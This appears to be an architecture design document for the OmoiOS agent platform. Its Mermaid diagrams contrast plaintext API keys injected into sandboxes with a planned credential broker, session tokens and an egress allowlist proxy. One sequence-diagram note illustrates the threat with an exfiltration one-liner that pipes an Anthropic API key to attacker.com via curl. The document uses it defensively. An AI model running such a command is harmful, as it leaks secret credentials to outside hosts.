# 07 · Architecture Diagrams

C4-style architectural views of current OmoiOS vs target state. Plus sequence diagrams for the key security-critical flows.

## 7.1 · Current OmoiOS — System Context (C4 Level 1)

```mermaid
C4Context
  title OmoiOS — Current System Context (April 2026)

  Person(owner, "Organization Owner", "Creates projects, invites team members, configures billing")
  Person(member, "Org Member", "Creates tickets and tasks, watches agent progress")

  System_Boundary(omoi, "OmoiOS") {
    System(frontend, "Frontend Dashboard", "Next.js 15 SaaS UI")
    System(backend, "FastAPI Backend", "Python — 125+ services, 60+ models, 40+ routers")
  }

  System_Ext(daytona, "Daytona", "Sandbox execution")
  System_Ext(anthropic, "Anthropic API", "Claude LLM")
  System_Ext(github, "GitHub", "User-linked OAuth + webhooks")
  System_Ext(stripe, "Stripe", "Billing")

  Rel(owner, frontend, "Uses", "HTTPS")
  Rel(member, frontend, "Uses", "HTTPS")
  Rel(frontend, backend, "Auth, data, WebSocket", "HTTPS/WSS")
  Rel(backend, daytona, "Spawns sandboxes")
  Rel(backend, anthropic, "Direct API calls (user-plaintext key)")
  Rel(backend, github, "OAuth + webhook receiver")
  Rel(backend, stripe, "Subscription + billing")
  Rel(daytona, anthropic, "Agent calls (via env-injected plaintext key)")
```

**Key observation:** Plaintext provider keys traverse `Backend → Daytona → Sandbox` (as env vars) and are then used by the agent to hit Anthropic. The sandbox holds credentials it shouldn't need to.

## 7.2 · Target State — System Context (C4 Level 1)

```mermaid
C4Context
  title OmoiOS — Target System Context (after PR 6)

  Person(owner, "Organization Owner")
  Person(member, "Org Member")
  Person(dev, "External Developer", "Uses SDK, Slack bot, or CI")

  System_Boundary(omoi, "OmoiOS Platform") {
    System(frontend, "Dashboard", "Next.js")
    System(backend, "FastAPI Backend", "Control plane + Session Service + Broker")
    System(egress, "Egress Proxy", "Go — hostname allowlist enforcement")
    System(sdk, "Public SDK", "TS + Python, from OpenAPI")
    System(ext, "Chrome Extension", "Plasmo + React")
  }

  System_Boundary(compute, "Compute") {
    System_Ext(modal, "Modal", "Sandbox runtime")
    System_Ext(daytona, "Daytona (legacy)", "Sandbox runtime — being phased")
  }

  System_Ext(anthropic, "Anthropic API")
  System_Ext(github, "GitHub", "OAuth + App installations")
  System_Ext(stripe, "Stripe")

  Rel(owner, frontend, "Uses", "HTTPS")
  Rel(dev, sdk, "Uses", "HTTPS")
  Rel(dev, ext, "Uses", "chrome.*")
  Rel(sdk, backend, "API + SSE", "HTTPS")
  Rel(ext, backend, "API", "HTTPS")
  Rel(frontend, backend, "WebSocket events", "WSS")
  Rel(backend, modal, "Sandbox lifecycle")
  Rel(backend, daytona, "Sandbox lifecycle (legacy)")
  Rel(modal, egress, "All outbound")
  Rel(daytona, egress, "All outbound")
  Rel(egress, anthropic, "If allowlisted")
  Rel(egress, github, "If allowlisted")
  Rel(modal, backend, "Broker: sess_tok_ → ephemeral credential", "HTTPS")
  Rel(backend, stripe, "Billing")
```

**Key change:** All sandbox outbound traffic flows through the egress proxy. Credentials are minted per-session, not embedded in the sandbox.

## 7.3 · Current OmoiOS — Container Diagram (C4 Level 2)

```mermaid
flowchart TB
  subgraph Users["Users"]
    U1[Owners]
    U2[Members]
  end

  subgraph Frontend["Next.js Frontend"]
    proxy[proxy.ts<br/>auth cookie state]
    dash[/command<br/>dashboard/]
    api[/api/ proxy to FastAPI]
  end

  subgraph Backend["FastAPI Backend"]
    routers[40+ routers:<br/>tasks, auth, orgs,<br/>events, github, oauth,<br/>billing, sandbox...]
    services[125+ services:<br/>auth_service<br/>authorization_service<br/>task_queue<br/>event_bus<br/>daytona_provider<br/>local_docker_provider<br/>sandbox_factory<br/>openhands_agent<br/>cost_tracking<br/>stripe_service<br/>oauth_service]
    workers[Workers:<br/>orchestrator_worker<br/>monitoring_worker<br/>watchdog]
  end

  subgraph Data["Data Layer"]
    pg[(Postgres 16<br/>+ pgvector)]
    redis[(Redis 7<br/>pub/sub + queues)]
  end

  subgraph Compute["Compute"]
    daytona[Daytona<br/>sandboxes]
  end

  subgraph External["External"]
    github[GitHub API]
    anth[Anthropic API]
    stripe[Stripe]
  end

  U1 & U2 --> proxy --> dash & api
  api --> routers
  routers --> services
  services --> pg
  services --> redis
  workers --> redis
  workers --> services
  services --> daytona
  daytona -.plaintext keys.-> anth
  services --> github
  services --> stripe
```

## 7.4 · Target State — Container Diagram (C4 Level 2)

```mermaid
flowchart TB
  subgraph Users["Users & Integrators"]
    U1[Dashboard users]
    U2[SDK consumers]
    U3[Chrome ext]
    U4[CI/Slack]
  end

  subgraph Frontend["Next.js Frontend"]
    dash[Dashboard]
  end

  subgraph SDK["Public Surfaces"]
    ts_sdk[TS SDK]
    py_sdk[Python SDK]
    plasmo[Chrome Extension]
    slack[Slack bot ref]
  end

  subgraph Backend["FastAPI Backend"]
    ctrl[Control Plane:<br/>orgs, projects,<br/>environments ⭐ NEW,<br/>secrets, connections]
    sess[Session Service:<br/>lifecycle, events,<br/>ACLs ⭐ NEW]
    broker[⭐ NEW<br/>Credential Broker:<br/>bearer_secret<br/>user_oauth<br/>github_app]
    hooks[⭐ NEW<br/>Webhook Dispatcher:<br/>HMAC-signed,<br/>retry-backoff]
    auth[Auth:<br/>platform keys<br/>user JWTs<br/>⭐ session tokens]
    sp[SandboxProvider<br/>facade]
  end

  subgraph Egress["⭐ NEW Egress Layer"]
    proxy[Egress Proxy<br/>hostname allowlist<br/>per-tenant]
  end

  subgraph Compute["Compute Providers"]
    modal[⭐ NEW<br/>ModalProvider]
    daytona[DaytonaProvider]
    local[LocalDockerProvider]
  end

  subgraph Data["Data"]
    pg[(Postgres)]
    redis[(Redis)]
  end

  subgraph External["External"]
    github[GitHub]
    anth[Anthropic]
    stripe[Stripe]
  end

  U1 --> dash --> ctrl & sess
  U2 --> ts_sdk --> ctrl & sess
  U2 --> py_sdk --> ctrl & sess
  U3 --> plasmo --> ctrl & sess
  U4 --> slack --> ctrl & sess

  ctrl --> auth
  sess --> auth
  broker --> auth

  sess --> sp
  sp --> modal
  sp --> daytona
  sp --> local

  modal & daytona & local --> proxy
  proxy --> anth
  proxy --> github

  modal & daytona & local -.sess_tok_.-> broker
  broker --> github
  broker --> anth

  sess --> hooks
  hooks -.HMAC.-> External

  ctrl & sess & broker & hooks --> pg
  sess & hooks --> redis

  ctrl --> stripe

  style broker fill:#fdd
  style hooks fill:#fdd
  style proxy fill:#fdd
  style modal fill:#fdd
  style ctrl fill:#dfd
```

Red = new containers. Green = existing with new responsibilities. Dotted lines show the new credential flow: sandbox never holds long-lived credentials; it mints per-request via the Broker.

## 7.5 · The Session Lifecycle — Current vs Target

### Current

```mermaid
sequenceDiagram
  autonumber
  participant U as User
  participant API as /api/routes/tasks.py
  participant DB as Postgres
  participant OW as orchestrator_worker
  participant UC as UserCredential lookup
  participant SP as SandboxProvider
  participant D as Daytona sandbox
  participant LLM as Anthropic API

  U->>API: POST /tasks (prompt + repo)
  API->>DB: INSERT task (status=pending)
  API-->>U: 201

  OW->>DB: SELECT pending task
  OW->>UC: get UserCredential(user, anthropic)
  UC-->>OW: api_key (PLAINTEXT from DB)
  OW->>SP: spawn_for_task(env_vars={ANTHROPIC_API_KEY: plaintext, ...})
  SP->>D: create sandbox, env-inject keys
  D-->>OW: sandbox_id

  Note over D: Agent runs, reads $ANTHROPIC_API_KEY
  D->>LLM: POST /v1/messages with Bearer <plaintext>
  LLM-->>D: response

  Note over D: If compromised: echo $ANTHROPIC_API_KEY | curl attacker.com
```

### Target

```mermaid
sequenceDiagram
  autonumber
  participant U as User
  participant API as /v1/.../sessions
  participant AUTH as auth_service
  participant ENV as environment_service
  participant DB as Postgres
  participant OW as orchestrator
  participant SP as SandboxProvider
  participant M as Modal sandbox
  participant EP as Egress Proxy
  participant BR as Credential Broker
  participant LLM as Anthropic API

  U->>API: POST /sessions (env_id, prompt)
  API->>ENV: resolve env_id@version
  ENV-->>API: Environment (with credentials map)
  API->>DB: INSERT session (pending, env_version)
  API->>AUTH: create_session_token(task_id, env.credentials)
  AUTH-->>API: sess_tok_… (1h, scoped)
  API-->>U: 201 {id, status:"pending"}

  OW->>DB: dequeue
  OW->>SP: spawn_for_task(env_vars={SESSION_TOKEN: sess_tok_, BROKER_URL})
  SP->>M: create sandbox, network ACL: only egress proxy
  M-->>OW: sandbox_id

  Note over M: Agent starts
  M->>BR: GET /broker/creds/anthropic<br/>Auth: sess_tok_
  BR->>AUTH: verify_session_token
  BR->>ENV: check env.credentials["anthropic"]
  BR->>DB: fetch encrypted secret, decrypt
  BR-->>M: {token, expires_at, scope:"anthropic"}

  M->>EP: POST api.anthropic.com/v1/messages<br/>Bearer <short-lived>
  EP->>EP: check Host in env.egress.allowed_hosts
  EP->>LLM: POST (proxied)
  LLM-->>EP: response
  EP-->>M: response

  Note over M: If M compromised: sess_tok_ = 1h blast radius,<br/>plus egress allowlist prevents exfil to attacker.com
```

## 7.6 · The Broker — Component Level (C4 Level 3)

```mermaid
flowchart TB
  subgraph Broker["Credential Broker - backend/omoi_os/api/routes/broker.py"]
    EP1["GET /broker/creds/:provider"]
    VER["verify_session_token"]
    LOOKUP["lookup env.credentials[provider]"]
    DISP{"dispatch binding.kind"}

    BS["bearer_secret flow"]
    UO["user_oauth flow"]
    GA["github_app flow"]

    AUDIT["record BrokerMint"]
    RESP[/"{token, expires_at, scope}"/]
  end

  subgraph External["External & Internal"]
    KV["secret KMS store"]
    AST["auth_service"]
    OS["oauth_service"]
    GH["GitHub App auth"]
    ENV["environment_service"]
    DB["Postgres audit"]
  end

  EP1 --> VER --> AST
  AST -->|"ok"| LOOKUP
  LOOKUP --> ENV
  LOOKUP --> DISP

  DISP -->|"bearer_secret"| BS
  DISP -->|"user_oauth"| UO
  DISP -->|"github_app"| GA

  BS --> KV --> AUDIT
  UO --> OS --> AUDIT
  GA --> GH --> AUDIT

  AUDIT --> DB --> RESP
```

All three binding kinds flow through the same audit → response path. Adding a new kind (e.g., `platform_aggregator` for fallback to platform's OpenCode Go key) is one new branch in the dispatch switch.

## 7.7 · The Environment → Session Binding

```mermaid
erDiagram
  Organization ||--o{ Project : contains
  Organization ||--o{ Environment : owns
  Project ||--o{ Environment : "default/preferred"
  Environment ||--o{ EnvironmentVersion : "versions (immutable)"

  Organization ||--o{ Task : owns
  Project ||--o{ Task : contains
  Task }o--|| EnvironmentVersion : "pinned @v"
  Task ||--o{ Event : emits
  Task ||--o{ Artifact : produces

  Task ||--|| APIKey : "session token"
  APIKey ||--o{ BrokerMint : "audit"

  Organization ||--o{ Secret : owns
  EnvironmentVersion }o--o{ Secret : "references via $secret"

  Organization ||--o{ Connection : "OAuth connections"
  EnvironmentVersion }o--o{ Connection : "references via credentials.user_oauth"

  Organization ||--o{ GithubInstallation : "App installation"
  EnvironmentVersion }o--o{ GithubInstallation : "references via credentials.github_app"
```

**Invariants to enforce at the model layer:**
- `EnvironmentVersion.version` is monotonic per `environment_id` (DB constraint)
- Once created, `EnvironmentVersion` is immutable (no UPDATE; only new versions)
- `Task.environment_version` FK is to specific version, never to "latest"
- `Secret.organization_id` must equal `EnvironmentVersion.organization_id` (tenant-scoped refs only)

## 7.8 · The Egress Proxy — Data Plane

```mermaid
flowchart LR
  subgraph Sandbox["Sandbox (Modal / Daytona)"]
    app["Agent process"]
    nacl["Network ACL:<br/>egress: proxy CIDR only"]
  end

  subgraph Proxy["Egress Proxy (Go)"]
    listener["HTTPS CONNECT + HTTP"]
    snic["SNI sniff → Host extract"]
    policy["session_token → Environment.egress<br/>check: Host in allowed_hosts"]
    deny[/"HTTP 451<br/>+ egress_denied event"/]
    fwd["stream forward"]
  end

  subgraph Internet
    anth["api.anthropic.com"]
    gh["api.github.com"]
    evil["attacker.com"]
  end

  app --> nacl --> listener --> snic --> policy
  policy -->|"allowed"| fwd
  policy -->|"denied"| deny
  fwd --> anth
  fwd --> gh
  deny -.-> evil
```

**Notes:**
- Policy lookup is O(1) via Redis cache keyed by `session_token → allowed_hosts`
- Proxy issues `egress_denied` event via event bus on every rejection for audit
- Metrics: `egress_allowed_total{host=}`, `egress_denied_total{host=,session=}`

## 7.9 · Data Flow — Where Plaintext Credentials Live

### Current (problematic)

```mermaid
flowchart LR
  DB1[(Postgres)] -->|"UserCredential.api_key PLAINTEXT"| OW[orchestrator]
  OW -->|"env_vars{ANTHROPIC_API_KEY}"| SB[Sandbox]
  SB -->|"$ANTHROPIC_API_KEY"| LLM[Anthropic]

  style DB1 fill:#fdd
  style OW fill:#fdd
  style SB fill:#fdd
```

Red = plaintext. Every hop holds the key.

### Target (secure)

```mermaid
flowchart LR
  KMS[KMS/encrypt] -->|"encrypted secret"| DB2[(Postgres)]
  DB2 -->|"sess_tok_ + decrypt"| BR[Broker]
  BR -->|"short-lived token"| SB[Sandbox]
  SB -->|"short-lived token"| EP[Egress Proxy]
  EP -->|"checked host"| LLM[Anthropic]

  style DB2 fill:#dfd
  style SB fill:#dfd
  style BR fill:#dfd
```

Green = non-leaky. Plaintext exists only in memory within the Broker for the duration of one mint response, and in the sandbox for the lifetime of one API call.

## 7.10 · Migration Deploy Topology

```mermaid
flowchart TB
  subgraph W1["Weeks 1–2"]
    W1A[Audit + adapter interfaces]
    W1B[Sessions API alias]
    W1C[Event envelope + SSE]
  end

  subgraph W3["Weeks 3–4"]
    W3A[Environment resource]
    W3B[Session token + Broker]
    W3C[Security gaps closed ✓]
  end

  subgraph W5["Week 5"]
    W5A[Egress proxy]
    W5B[Full trust boundary ✓]
  end

  subgraph W6["Week 6"]
    W6A[Modal provider parallel]
    W6B[Feature flag per tenant]
  end

  subgraph W7["Week 7"]
    W7A[Public TS + Python SDK]
    W7B[First external customer-callable API]
  end

  subgraph W8["Week 8"]
    W8A[Client surfaces]
    W8B[Polish: Artifact, webhooks, ACL, quota]
  end

  W1 --> W3 --> W5 --> W6 --> W7 --> W8
```

Each week's output is shippable. No big-bang cutover.

## 7.11 · Provider Adapter Layering

```mermaid
classDiagram
  class SandboxProvider {
    <<interface>>
    +spawn_for_task(task_id, agent_id, phase_id, env_vars, runtime, mode, image) SandboxResult
    +terminate_sandbox(sandbox_id) None
    +get_status(sandbox_id) SandboxStatus
    +list_active() list~SandboxStatus~
  }

  class DaytonaProvider {
    -spawner: DaytonaSpawnerService
    +spawn_for_task(...) SandboxResult
    +terminate_sandbox(...) None
  }

  class LocalDockerProvider {
    -image: str
    -mount_workspace: bool
    +spawn_for_task(...) SandboxResult
  }

  class ModalProvider {
    -modal_client: ModalClient
    -egress_proxy_cidr: str
    +spawn_for_task(...) SandboxResult
    +terminate_sandbox(...) None
  }

  SandboxProvider <|.. DaytonaProvider
  SandboxProvider <|.. LocalDockerProvider
  SandboxProvider <|.. ModalProvider

  class SandboxFactory {
    +create_sandbox_provider(config) SandboxProvider
  }

  SandboxFactory ..> SandboxProvider : creates
```

The `SandboxProvider` Protocol is the migration boundary. Adding Modal is a new class implementing the existing interface. Per-tenant flag in `Organization.sandbox_provider` decides which provider the factory returns.

## 7.12 · Summary

These diagrams make one thing visible that the prose alone couldn't:

**The sandbox doesn't need to be rewritten — it needs to be wrapped.**

Current `SandboxProvider` is clean. Adding Modal is additive. The real architectural work is introducing the **Broker + Environment + Egress** triangle around the sandbox to contain blast radius. That's what turns OmoiOS from "works for one trusted org" to "works for arbitrary tenants with hostile sandboxes."

Back to [`README.md`](./README.md) · [`01-executive-summary.md`](./01-executive-summary.md)
